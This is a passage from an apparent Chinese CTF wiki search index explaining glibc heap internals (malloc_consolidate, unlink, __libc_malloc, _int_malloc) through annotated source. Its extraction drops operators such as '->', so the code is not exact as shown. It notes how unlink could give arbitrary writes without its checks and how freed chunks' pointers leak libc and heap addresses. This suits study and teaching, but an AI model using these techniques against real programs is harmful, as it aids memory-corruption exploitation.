\ni\n;\n\n    \nmbinptr\n \nbin\n;\n\n\n    \n/* Establish circular links for normal bins */\n\n    \nfor\n \n(\ni\n \n=\n \n1\n;\n \ni\n \n \nNBINS\n;\n \n++\ni\n)\n \n{\n\n        \nbin\n     \n=\n \nbin_at\n(\nav\n,\n \ni\n);\n\n        \nbin\n-\nfd\n \n=\n \nbin\n-\nbk\n \n=\n \nbin\n;\n\n    \n}\n\n\n\n#if MORECORE_CONTIGUOUS\n\n    \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n\n\n#endif\n\n        \nset_noncontiguous\n(\nav\n);\n\n    \nif\n \n(\nav\n \n==\n \nmain_arena\n)\n \nset_max_fast\n(\nDEFAULT_MXFAST\n);\n\n    \n// \u8bbe\u7f6e flags \u6807\u8bb0\u76ee\u524d\u6ca1\u6709fast chunk\n\n    \nav\n-\nflags\n \n|=\n \nFASTCHUNKS_BIT\n;\n\n    \n// \u5c31\u662f unsorted bin\n\n    \nav\n-\ntop\n \n=\n \ninitial_top\n(\nav\n);\n\n\n}\n\n\n\n\n\nmalloc_consolidate\n\n\n\u8be5\u51fd\u6570\u4e3b\u8981\u6709\u4e24\u4e2a\u529f\u80fd\n\n\n\n\n\u82e5 fastbin \u672a\u521d\u59cb\u5316\uff0c\u5373 global_max_fast \u4e3a0\uff0c\u90a3\u5c31\u521d\u59cb\u5316 malloc_state\u3002\n\n\n\u5982\u679c\u5df2\u7ecf\u521d\u59cb\u5316\u7684\u8bdd\uff0c\u5c31\u5408\u5e76 fastbin \u4e2d\u7684 chunk\u3002\n\n\n\n\n\u57fa\u672c\u7684\u6d41\u7a0b\u5982\u4e0b\n\n\n\u521d\u59cb\n\n\nstatic\n \nvoid\n \nmalloc_consolidate\n(\nmstate\n \nav\n)\n \n{\n\n    \nmfastbinptr\n \n*\nfb\n;\n             \n/* current fastbin being consolidated */\n\n    \nmfastbinptr\n \n*\nmaxfb\n;\n          \n/* last fastbin (for loop control) */\n\n    \nmchunkptr\n    \np\n;\n              \n/* current chunk being consolidated */\n\n    \nmchunkptr\n    \nnextp\n;\n          \n/* next chunk to consolidate */\n\n    \nmchunkptr\n    \nunsorted_bin\n;\n   \n/* bin header */\n\n    \nmchunkptr\n    \nfirst_unsorted\n;\n \n/* chunk to link to */\n\n\n    \n/* These have same use as in free() */\n\n    \nmchunkptr\n       \nnextchunk\n;\n\n    \nINTERNAL_SIZE_T\n \nsize\n;\n\n    \nINTERNAL_SIZE_T\n \nnextsize\n;\n\n    \nINTERNAL_SIZE_T\n \nprevsize\n;\n\n    \nint\n             \nnextinuse\n;\n\n    \nmchunkptr\n       \nbck\n;\n\n    \nmchunkptr\n       \nfwd\n;\n\n\n\n\n\n\u5408\u5e76 chunk\n\n\n    \n/*\n\n\n      If max_fast is 0, we know that av hasn\nt\n\n\n      yet been initialized, in which case do so below\n\n\n    */\n\n    \n// \u8bf4\u660e fastbin \u5df2\u7ecf\u521d\u59cb\u5316\n\n    \nif\n \n(\nget_max_fast\n()\n \n!=\n \n0\n)\n \n{\n\n        \n// \u6e05\u7a7a fastbin \u6807\u8bb0\n\n        \n// \u56e0\u4e3a\u8981\u5408\u5e76 fastbin \u4e2d\u7684 chunk \u4e86\u3002\n\n        \nclear_fastchunks\n(\nav\n);\n\n        \n// \n\n        \nunsorted_bin\n \n=\n \nunsorted_chunks\n(\nav\n);\n\n\n        \n/*\n\n\n          Remove each chunk from fast bin and consolidate it, placing it\n\n\n          then in unsorted bin. Among other reasons for doing this,\n\n\n          placing in unsorted bin avoids needing to calculate actual bins\n\n\n          until malloc is sure that chunks aren\nt immediately going to be\n\n\n          reused anyway.\n\n\n        */\n\n        \n// \u6309\u7167 fd \u987a\u5e8f\u904d\u5386 fastbin \u7684\u6bcf\u4e00\u4e2a bin\uff0c\u5c06 bin \u4e2d\u7684\u6bcf\u4e00\u4e2a chunk \u5408\u5e76\u6389\u3002\n\n        \nmaxfb\n \n=\n \nfastbin\n(\nav\n,\n \nNFASTBINS\n \n-\n \n1\n);\n\n        \nfb\n    \n=\n \nfastbin\n(\nav\n,\n \n0\n);\n\n        \ndo\n \n{\n\n            \np\n \n=\n \natomic_exchange_acq\n(\nfb\n,\n \nNULL\n);\n\n            \nif\n \n(\np\n \n!=\n \n0\n)\n \n{\n\n                \ndo\n \n{\n\n                    \ncheck_inuse_chunk\n(\nav\n,\n \np\n);\n\n                    \nnextp\n \n=\n \np\n-\nfd\n;\n\n\n                    \n/* Slightly streamlined version of consolidation code in\n\n\n                     * free() */\n\n                    \nsize\n      \n=\n \nchunksize\n(\np\n);\n\n                    \nnextchunk\n \n=\n \nchunk_at_offset\n(\np\n,\n \nsize\n);\n\n                    \nnextsize\n  \n=\n \nchunksize\n(\nnextchunk\n);\n\n\n                    \nif\n \n(\n!\nprev_inuse\n(\np\n))\n \n{\n\n                        \nprevsize\n \n=\n \nprev_size\n(\np\n);\n\n                        \nsize\n \n+=\n \nprevsize\n;\n\n                        \np\n \n=\n \nchunk_at_offset\n(\np\n,\n \n-\n((\nlong\n)\n \nprevsize\n));\n\n                        \nunlink\n(\nav\n,\n \np\n,\n \nbck\n,\n \nfwd\n);\n\n                    \n}\n\n\n                    \nif\n \n(\nnextchunk\n \n!=\n \nav\n-\ntop\n)\n \n{\n\n                        \n// \u5224\u65ad nextchunk \u662f\u5426\u662f\u7a7a\u95f2\u7684\u3002\n\n                        \nnextinuse\n \n=\n \ninuse_bit_at_offset\n(\nnextchunk\n,\n \nnextsize\n);\n\n\n                        \nif\n \n(\n!\nnextinuse\n)\n \n{\n\n                            \nsize\n \n+=\n \nnextsize\n;\n\n                            \nunlink\n(\nav\n,\n \nnextchunk\n,\n \nbck\n,\n \nfwd\n);\n\n                        \n}\n \nelse\n\n                         \n// \u8bbe\u7f6e nextchunk \u7684 prev inuse \u4e3a0\uff0c\u4ee5\u8868\u660e\u53ef\u4ee5\u5408\u5e76\u5f53\u524d fast chunk\u3002\n\n                            \nclear_inuse_bit_at_offset\n(\nnextchunk\n,\n \n0\n);\n\n\n                        \nfirst_unsorted\n     \n=\n \nunsorted_bin\n-\nfd\n;\n\n                        \nunsorted_bin\n-\nfd\n   \n=\n \np\n;\n\n                        \nfirst_unsorted\n-\nbk\n \n=\n \np\n;\n\n\n                        \nif\n \n(\n!\nin_smallbin_range\n(\nsize\n))\n \n{\n\n                            \np\n-\nfd_nextsize\n \n=\n \nNULL\n;\n\n                            \np\n-\nbk_nextsize\n \n=\n \nNULL\n;\n\n                        \n}\n\n\n                        \nset_head\n(\np\n,\n \nsize\n \n|\n \nPREV_INUSE\n);\n\n                        \np\n-\nbk\n \n=\n \nunsorted_bin\n;\n\n                        \np\n-\nfd\n \n=\n \nfirst_unsorted\n;\n\n                        \nset_foot\n(\np\n,\n \nsize\n);\n\n                    \n}\n\n\n                    \nelse\n \n{\n\n                        \nsize\n \n+=\n \nnextsize\n;\n\n                        \nset_head\n(\np\n,\n \nsize\n \n|\n \nPREV_INUSE\n);\n\n                        \nav\n-\ntop\n \n=\n \np\n;\n\n                    \n}\n\n\n                \n}\n \nwhile\n \n((\np\n \n=\n \nnextp\n)\n \n!=\n \n0\n);\n\n            \n}\n\n        \n}\n \nwhile\n \n(\nfb\n++\n \n!=\n \nmaxfb\n);\n\n\n\n\n\n\u521d\u59cb\u5316\n\n\n\u8bf4\u660e fastbin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002\n\n\n    \n}\n \nelse\n \n{\n\n        \nmalloc_init_state\n(\nav\n);\n\n        \n// \u5728\u975e\u8c03\u8bd5\u60c5\u51b5\u4e0b\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u5728\u8c03\u8bd5\u60c5\u51b5\u4e0b\uff0c\u505a\u4e00\u4e9b\u68c0\u6d4b\u3002\n\n        \ncheck_malloc_state\n(\nav\n);\n\n    \n}\n\n\n\n\n\n\u6d4b\u8bd5\u652f\u6301\n\n\n\u4e0b\u9762\u7684\u4ee3\u7801\u7528\u4e8e\u652f\u6301\u6d4b\u8bd5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b perturb_byte \u662f0\u3002\n\n\nstatic\n \nint\n \nperturb_byte\n;\n\n\n\nstatic\n \nvoid\n \nalloc_perturb\n(\nchar\n \n*\np\n,\n \nsize_t\n \nn\n)\n \n{\n\n    \nif\n \n(\n__glibc_unlikely\n(\nperturb_byte\n))\n \nmemset\n(\np\n,\n \nperturb_byte\n \n^\n \n0xff\n,\n \nn\n);\n\n\n}\n\n\n\nstatic\n \nvoid\n \nfree_perturb\n(\nchar\n \n*\np\n,\n \nsize_t\n \nn\n)\n \n{\n\n    \nif\n \n(\n__glibc_unlikely\n(\nperturb_byte\n))\n \nmemset\n(\np\n,\n \nperturb_byte\n,\n \nn\n);\n\n\n}", 
            "title": "\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_1", 
            "text": "\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u4efb\u4f55\u5806\u7684\u5b9e\u73b0\u90fd\u9700\u8981\u4ece\u4ee5\u4e0b\u4e24\u4e2a\u89d2\u5ea6\u8003\u8651\u76f8\u5e94\u7684\u95ee\u9898   \u5b8f\u89c2\u89d2\u5ea6  \u521b\u5efa\u5806  \u5806\u521d\u59cb\u5316  \u5220\u9664\u5806    \u5fae\u89c2\u89d2\u5ea6  \u7533\u8bf7\u5185\u5b58\u5757  \u91ca\u653e\u5185\u5b58\u5757     \u5f53\u7136\uff0c\u8fd9\u4e9b\u90fd\u662f\u6bd4\u8f83\u9ad8\u5c42\u9762\u7684\u60f3\u6cd5\uff0c\u4e0d\u540c\u7684\u5806\u7684\u5e95\u5c42\u5b9e\u73b0\u4f1a\u6709\u6240\u4e0d\u540c\u3002", 
            "title": "\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_2", 
            "text": "", 
            "title": "\u5806\u5b9e\u73b0\u6982\u89c8"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_3", 
            "text": "\u5806\u521d\u59cb\u5316\u662f\u5728\u7528\u6237\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\u6267\u884c malloc_consolidate \u518d\u6267\u884c malloc_init_state \u5b9e\u73b0\u7684\u3002\u8fd9\u91cc\u4e0d\u505a\u8fc7\u591a\u8bb2\u89e3\u3002\u53ef\u4ee5\u53c2\u89c1  malloc_state \u76f8\u5173\u51fd\u6570 \u3002", 
            "title": "\u5806\u521d\u59cb\u5316"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_4", 
            "text": "", 
            "title": "\u521b\u5efa\u5806"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_5", 
            "text": "", 
            "title": "\u53cc\u5411\u94fe\u8868\u76f8\u5173\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#unlink", 
            "text": "unlink \u7528\u6765\u5c06\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff08\u53ea\u5b58\u50a8\u7a7a\u95f2\u7684 chunk\uff09\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u53d6\u51fa\u6765\uff0c\u53ef\u80fd\u5728\u4ee5\u4e0b\u5730\u65b9\u4f7f\u7528   malloc  \u4ece\u6070\u597d\u5927\u5c0f\u5408\u9002\u7684 large bin \u4e2d\u83b7\u53d6 chunk\u3002  \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f fastbin \u4e0e small bin \u5c31\u6ca1\u6709\u4f7f\u7528 unlink\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6f0f\u6d1e\u4f1a\u7ecf\u5e38\u51fa\u73b0\u5728\u5b83\u4eec\u8fd9\u91cc\u7684\u539f\u56e0\u3002  \u4f9d\u6b21\u904d\u5386\u5904\u7406 unsorted bin \u65f6\u4e5f\u6ca1\u6709\u4f7f\u7528 unlink \u7684\u3002    \u4ece\u6bd4\u8bf7\u6c42\u7684 chunk \u6240\u5728\u7684 bin \u5927\u7684 bin \u4e2d\u53d6 chunk\u3002    Free  \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002  \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002    malloc_consolidate  \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002  \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002    realloc  \u524d\u5411\u6269\u5c55\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86top chunk\uff09\u3002     \u7531\u4e8e unlink \u4f7f\u7528\u975e\u5e38\u9891\u7e41\uff0c\u6240\u4ee5 unlink \u88ab\u5b9e\u73b0\u4e3a\u4e86\u4e00\u4e2a\u5b8f\uff0c\u5982\u4e0b  /* Take a chunk off a bin list */  // unlink p  #define unlink(AV, P, BK, FD) {                                            \\       // \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 \n     if   ( __builtin_expect   ( chunksize ( P )   !=   prev_size   ( next_chunk ( P )),   0 ))       \\\n       malloc_printerr   ( corrupted size vs. prev_size );                \\\n     FD   =   P - fd ;                                                                       \\\n     BK   =   P - bk ;                                                                       \\\n     // \u9632\u6b62\u653b\u51fb\u8005\u7b80\u5355\u7be1\u6539\u7a7a\u95f2\u7684 chunk \u7684 fd \u4e0e bk \u6765\u5b9e\u73b0\u4efb\u610f\u5199\u7684\u6548\u679c\u3002 \n     if   ( __builtin_expect   ( FD - bk   !=   P   ||   BK - fd   !=   P ,   0 ))                       \\\n       malloc_printerr   ( check_action ,   corrupted double-linked list ,   P ,   AV );   \\\n     else   {                                                                       \\\n         FD - bk   =   BK ;                                                               \\\n         BK - fd   =   FD ;                                                               \\\n         // \u4e0b\u9762\u4e3b\u8981\u8003\u8651 P \u5bf9\u5e94\u7684 nextsize \u53cc\u5411\u94fe\u8868\u7684\u4fee\u6539 \n         if   ( ! in_smallbin_range   ( chunksize_nomask   ( P ))                               \\\n             // \u5982\u679cP- fd_nextsize\u4e3a NULL\uff0c\u8868\u660e P \u672a\u63d2\u5165\u5230 nextsize \u94fe\u8868\u4e2d\u3002 \n             // \u90a3\u4e48\u5176\u5b9e\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u5bf9 nextsize \u5b57\u6bb5\u8fdb\u884c\u4fee\u6539\u4e86\u3002 \n             // \u8fd9\u91cc\u6ca1\u6709\u53bb\u5224\u65ad bk_nextsize \u5b57\u6bb5\uff0c\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u3002 \n               __builtin_expect   ( P - fd_nextsize   !=   NULL ,   0 ))   {                       \\\n             // \u7c7b\u4f3c\u4e8e\u5c0f\u7684 chunk \u7684\u68c0\u67e5\u601d\u8def \n             if   ( __builtin_expect   ( P - fd_nextsize - bk_nextsize   !=   P ,   0 )               \\\n                 ||   __builtin_expect   ( P - bk_nextsize - fd_nextsize   !=   P ,   0 ))     \\\n               malloc_printerr   ( check_action ,                                       \\\n                                corrupted double-linked list (not small) ,     \\\n                                P ,   AV );                                               \\\n             // \u8fd9\u91cc\u8bf4\u660e P \u5df2\u7ecf\u5728 nextsize \u94fe\u8868\u4e2d\u4e86\u3002 \n             // \u5982\u679c FD \u6ca1\u6709\u5728 nextsize \u94fe\u8868\u4e2d \n             if   ( FD - fd_nextsize   ==   NULL )   {                                       \\\n                 // \u5982\u679c nextsize \u4e32\u8d77\u6765\u7684\u53cc\u94fe\u8868\u53ea\u6709 P \u672c\u8eab\uff0c\u90a3\u5c31\u76f4\u63a5\u62ff\u8d70 P \n                 // \u4ee4 FD \u4e3a nextsize \u4e32\u8d77\u6765\u7684 \n                 if   ( P - fd_nextsize   ==   P )                                       \\\n                   FD - fd_nextsize   =   FD - bk_nextsize   =   FD ;                       \\\n                 else   {                                                               \\\n                 // \u5426\u5219\u6211\u4eec\u9700\u8981\u5c06 FD \u63d2\u5165\u5230 nextsize \u5f62\u6210\u7684\u53cc\u94fe\u8868\u4e2d \n                     FD - fd_nextsize   =   P - fd_nextsize ;                               \\\n                     FD - bk_nextsize   =   P - bk_nextsize ;                               \\\n                     P - fd_nextsize - bk_nextsize   =   FD ;                               \\\n                     P - bk_nextsize - fd_nextsize   =   FD ;                               \\\n                   }                                                               \\\n               }   else   {                                                               \\\n                 // \u5982\u679c\u5728\u7684\u8bdd\uff0c\u76f4\u63a5\u62ff\u8d70\u5373\u53ef \n                 P - fd_nextsize - bk_nextsize   =   P - bk_nextsize ;                       \\\n                 P - bk_nextsize - fd_nextsize   =   P - fd_nextsize ;                       \\\n               }                                                                       \\\n           }                                                                       \\\n       }                                                                               \\ }   \u8fd9\u91cc\u6211\u4eec\u4ee5 small bin \u7684 unlink \u4e3a\u4f8b\u5b50\u4ecb\u7ecd\u4e00\u4e0b\u3002\u5bf9\u4e8e large bin \u7684 unlink\uff0c\u4e0e\u5176\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2anextsize \u7684\u5904\u7406\u3002   \u53ef\u4ee5\u770b\u51fa\uff0c  P \u6700\u540e\u7684 fd \u548c bk \u6307\u9488\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316 \uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\u65f6\uff0c\u5df2\u7ecf\u904d\u5386\u4e0d\u5230\u5bf9\u5e94\u7684\u94fe\u8868\u4e86\u3002\u8fd9\u4e00\u70b9\u6ca1\u6709\u53d8\u5316\u8fd8\u662f\u5f88\u6709\u7528\u5904\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u6709\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u6cc4\u6f0f\u5730\u5740   libc \u5730\u5740  P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cbk \u6cc4\u6f0f  P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cfd \u6cc4\u6f0f  \u53cc\u5411\u94fe\u8868\u53ea\u5305\u542b\u4e00\u4e2a\u7a7a\u95f2 chunk \u65f6\uff0cP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f    \u6cc4\u6f0f\u5806\u5730\u5740\uff0c\u53cc\u5411\u94fe\u8868\u5305\u542b\u591a\u4e2a\u7a7a\u95f2 chunk  P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cfd \u6cc4\u6f0f  P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f  P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cbk \u6cc4\u6f0f     \u6ce8\u610f   \u8fd9\u91cc\u7684\u5934\u90e8\u6307\u7684\u662f bin \u7684 fd \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u65b0\u52a0\u5165\u7684 chunk\u3002  \u8fd9\u91cc\u7684\u5c3e\u90e8\u6307\u7684\u662f bin \u7684 bk \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u5148\u52a0\u5165\u7684 chunk\u3002   \u540c\u65f6\uff0c\u5bf9\u4e8e\u65e0\u8bba\u662f\u5bf9\u4e8e fd\uff0cbk \u8fd8\u662f fd_nextsize \uff0cbk_nextsize\uff0c\u7a0b\u5e8f\u90fd\u4f1a\u68c0\u6d4b fd \u548c bk \u662f\u5426\u6ee1\u8db3\u5bf9\u5e94\u7684\u8981\u6c42\u3002  // fd bk  if   ( __builtin_expect   ( FD - bk   !=   P   ||   BK - fd   !=   P ,   0 ))                       \\\n   malloc_printerr   ( check_action ,   corrupted double-linked list ,   P ,   AV );   \\\n\n   // next_size related \n               if   ( __builtin_expect   ( P - fd_nextsize - bk_nextsize   !=   P ,   0 )               \\\n                 ||   __builtin_expect   ( P - bk_nextsize - fd_nextsize   !=   P ,   0 ))     \\\n               malloc_printerr   ( check_action ,                                       \\\n                                corrupted double-linked list (not small) ,     \\\n                                P ,   AV );      \u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6b63\u5e38\u3002\u6211\u4eec\u4ee5 fd \u548c bk \u4e3a\u4f8b\uff0cP \u7684 forward chunk \u7684 bk \u5f88\u81ea\u7136\u662f P \uff0c\u540c\u6837 P \u7684 backward chunk \u7684 fd \u4e5f\u5f88\u81ea\u7136\u662f P \u3002\u5982\u679c\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u68c0\u67e5\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 P \u7684 fd \u4e0e bk\uff0c\u4ece\u800c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53c2\u89c1\u5229\u7528\u90e8\u5206\u7684 unlink \u3002  \u6ce8\u610f\uff1a\u5806\u7684\u7b2c\u4e00\u4e2a chunk \u6240\u8bb0\u5f55\u7684 prev_inuse \u4f4d\u9ed8\u8ba4\u4e3a1\u3002", 
            "title": "unlink"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_6", 
            "text": "\u4e00\u822c\u6211\u4eec\u4f1a\u4f7f\u7528 malloc \u51fd\u6570\u6765\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u53ef\u662f\u5f53\u4ed4\u7ec6\u770b glibc \u7684\u6e90\u7801\u5b9e\u73b0\u65f6\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709malloc \u51fd\u6570\u3002\u5176\u5b9e\u8be5\u51fd\u6570\u771f\u6b63\u8c03\u7528\u7684\u662f __libc_malloc \u51fd\u6570\u3002\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5199\u4e2a malloc \u51fd\u6570\u5462\uff0c\u56e0\u4e3a\u6709\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c__libc_malloc \u51fd\u6570\u53ea\u662f\u7528\u6765\u7b80\u5355\u5c01\u88c5 _int_malloc \u51fd\u6570\u3002_int_malloc \u624d\u662f\u7533\u8bf7\u5185\u5b58\u5757\u7684\u6838\u5fc3\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u5b9e\u73b0\u3002", 
            "title": "\u7533\u8bf7\u5185\u5b58\u5757"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#__libc_malloc", 
            "text": "\u8be5\u51fd\u6570\u4f1a\u9996\u5148\u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u94a9\u5b50\u51fd\u6570\uff08__malloc_hook\uff09\uff0c\u8fd9\u4e2a\u4e3b\u8981\u7528\u4e8e\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u51fd\u6570\uff0c\u65b9\u4fbf\u7528\u6237\u5feb\u901f\u4fee\u6539\u5bf9\u5206\u914d\u51fd\u6570\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570 \u3002  // wapper for int_malloc  void   * __libc_malloc ( size_t   bytes )   { \n     mstate   ar_ptr ; \n     void   *   victim ; \n     // \u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u94a9\u5b50\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de. \n     void   * ( * hook )( size_t ,   const   void   * )   =   atomic_forced_read ( __malloc_hook ); \n     if   ( __builtin_expect ( hook   !=   NULL ,   0 )) \n         return   ( * hook )( bytes ,   RETURN_ADDRESS ( 0 ));   \u63a5\u7740\u4f1a\u5bfb\u627e\u4e00\u4e2a arena \u6765\u8bd5\u56fe\u5206\u914d\u5185\u5b58\u3002       arena_get ( ar_ptr ,   bytes );   \u7136\u540e\u8c03\u7528 _int_malloc \u51fd\u6570\u53bb\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\u3002       victim   =   _int_malloc ( ar_ptr ,   bytes );   \u5982\u679c\u5206\u914d\u5931\u8d25\u7684\u8bdd\uff0cptmalloc \u4f1a\u5c1d\u8bd5\u518d\u53bb\u5bfb\u627e\u4e00\u4e2a\u53ef\u7528\u7684 arena\uff0c\u5e76\u5206\u914d\u5185\u5b58\u3002       /* Retry with another arena only if we were able to find a usable arena         before.  */ \n     if   ( ! victim     ar_ptr   !=   NULL )   { \n         LIBC_PROBE ( memory_malloc_retry ,   1 ,   bytes ); \n         ar_ptr   =   arena_get_retry ( ar_ptr ,   bytes ); \n         victim   =   _int_malloc ( ar_ptr ,   bytes ); \n     }   \u5982\u679c\u7533\u8bf7\u5230\u4e86 arena\uff0c\u90a3\u4e48\u5728\u9000\u51fa\u4e4b\u524d\u8fd8\u5f97\u89e3\u9501\u3002       if   ( ar_ptr   !=   NULL )   __libc_lock_unlock ( ar_ptr - mutex );   \u5224\u65ad\u76ee\u524d\u7684\u72b6\u6001\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6   \u8981\u4e48\u6ca1\u6709\u7533\u8bf7\u5230\u5185\u5b58  \u8981\u4e48\u662f mmap \u7684\u5185\u5b58  \u8981\u4e48\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5fc5\u987b\u5728\u5176\u6240\u5206\u914d\u7684arena\u4e2d        assert ( ! victim   ||   chunk_is_mmapped ( mem2chunk ( victim ))   || \n            ar_ptr   ==   arena_for_chunk ( mem2chunk ( victim )));   \u6700\u540e\u8fd4\u56de\u5185\u5b58\u3002       return   victim ;  }", 
            "title": "__libc_malloc"
        }, 
        {
            "location": "/pwn/heap/heap_implementation_details/#_int_malloc", 
            "text": "_int_malloc \u662f\u5185\u5b58\u5206\u914d\u7684\u6838\u5fc3\u51fd\u6570\uff0c\u5176\u6838\u5fc3\u601d\u8def\u6709\u5982\u4e0b   \u5b83\u6839\u636e\u7528\u6237\u7533\u8bf7\u7684 \u5185\u5b58\u5757\u5927\u5c0f \u4ee5\u53ca \u76f8\u5e94\u5927\u5c0f chunk \u901a\u5e38\u4f7f\u7528\u7684\u9891\u5ea6 \uff08fastbin chunk, small chunk, large chunk\uff09\uff0c\u4f9d\u6b21\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5206\u914d\u65b9\u6cd5\u3002  \u5b83\u7531\u5c0f\u5230\u5927\u4f9d\u6b21\u68c0\u67e5\u4e0d\u540c\u7684 bin \u4e2d\u662f\u5426\u6709\u76f8\u5e94\u7684\u7a7a\u95f2\u5757\u53ef\u4ee5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u3002  \u5f53\u6240\u6709\u7684\u7a7a\u95f2 chunk \u90fd\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5b83\u4f1a\u8003\u8651 top chunk\u3002  \u5f53 top chunk \u4e5f\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5806\u5206\u914d\u5668\u624d\u4f1a\u8fdb\u884c\u5185\u5b58\u5757\u7533\u8bf7\u3002   \u5728\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u51fd\u6570\u7acb\u9a6c\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u81ea\u5df1\u9700\u8981\u7684\u53d8\u91cf\uff0c\u5e76\u5c06\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u8f6c\u6362\u4e3a\u5185\u90e8\u7684chunk\u5927\u5c0f\u3002  static   void   * _int_malloc ( mstate   av ,   size_t   bytes )   { \n     INTERNAL_SIZE_T   nb ;    /* normalized request size */ \n     unsigned   int      idx ;   /* associated bin index */ \n     mbinptr           bin ;   /* associated bin */ \n\n     mchunkptr         victim ;         /* inspected/selected chunk */ \n     INTERNAL_SIZE_T   size ;           /* its size */ \n     int               victim_index ;   /* its bin index */ \n\n     mchunkptr       remainder ;        /* remainder from a split */ \n    